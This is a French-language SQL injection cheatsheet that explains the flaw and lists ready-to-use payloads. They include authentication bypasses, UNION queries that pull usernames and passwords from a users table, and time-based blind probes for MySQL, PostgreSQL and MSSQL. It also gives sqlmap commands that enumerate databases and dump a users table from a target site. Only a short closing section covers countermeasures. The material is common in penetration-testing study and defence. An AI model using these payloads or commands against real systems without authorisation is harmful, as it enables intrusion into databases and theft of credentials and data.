# 💉 SQL Injection (SQLi) - Cheatsheet Cyber

Ce fichier fournit une synthèse complète pour détecter, comprendre et exploiter les **injections SQL**, une des vulnérabilités web les plus critiques, avec des exemples concrets et étapes de test.

---

## 🔍 1. Qu’est-ce qu’une SQL Injection ?

Une **SQLi** survient lorsqu’une application intègre de manière non sécurisée des **données utilisateur** dans une requête SQL. Cela peut permettre :

- Contournement d’authentification
- Lecture / modification de données
- Exécution de requêtes arbitraires
- RCE (si DB accessible au système)

---

## 🔎 2. Étapes pour détecter une SQLi

### Tester les champs d’entrée (formulaires, paramètres URL)

Entrer des payloads de test :

' OR '1'='1  
" OR "1"="1  
')--  
> Si l’application retourne un comportement inattendu (connexion réussie, erreur SQL), c’est probablement vulnérable

### Utiliser l’erreur SQL

'  
> Peut renvoyer une erreur SQL du type `You have an error in your SQL syntax`

---

## 🧪 3. Payloads d’exploration

### Bypass Authentification

' OR '1'='1' --  
admin' --  
admin' #  
> Permet d’accéder à un compte sans mot de passe

### Extraction de données

' UNION SELECT null, version() --  
> Tente de combiner deux requêtes (extraction de version)

' UNION SELECT username, password FROM users --  
> Extrait identifiants si 2 colonnes affichées

---

## 🧠 4. Fonctions utiles par SGBD

### MySQL

version()  
user()  
database()  
@@datadir  
> Infos sur la base de données, l’utilisateur et le système

### PostgreSQL

current_database()  
current_user  
pg_sleep(5)  
> pg_sleep est utile pour la détection **blind** (temps de réponse)

### MSSQL

@@version  
SUSER_NAME()  
WAITFOR DELAY '0:0:5'  
> Détecter via délai (injection aveugle)

---

## 🕶 5. Types de SQLi

### 🟢 Classique

Injection directe visible dans la réponse :

id=1' OR '1'='1  

### 🟡 Blind SQLi

Aucune erreur visible. Utiliser :

id=1 AND 1=1  
id=1 AND 1=2  
> Si les réponses sont différentes : vulnérable

### 🔴 Time-Based Blind

Tester avec délais :

id=1 AND SLEEP(5) -- (MySQL)  
id=1; WAITFOR DELAY '0:0:5' -- (MSSQL)  
> Si le serveur prend 5 secondes à répondre : vulnérable

---

## ⚙️ 6. Automatisation avec sqlmap

sqlmap -u "http://target.com/index.php?id=1" --batch --dbs  
> Enumération des bases

sqlmap -u "http://target.com/index.php?id=1" -D dbname -T users --dump  
> Dump de la table `users`

sqlmap --forms -u "http://target.com/login.php" --level=5  
> Test automatique des formulaires

---

## 🛡 7. Contre-mesures

- Utiliser des requêtes **préparées** (paramétrées)
- Éviter la concaténation SQL avec des entrées utilisateur
- Valider & filtrer les entrées côté serveur
- Moindres privilèges pour les comptes DB

---

## 📌 Ressources utiles

- [PayloadsAllTheThings - SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks - SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [PortSwigger - SQLi Academy](https://portswigger.net/web-security/sql-injection)

---
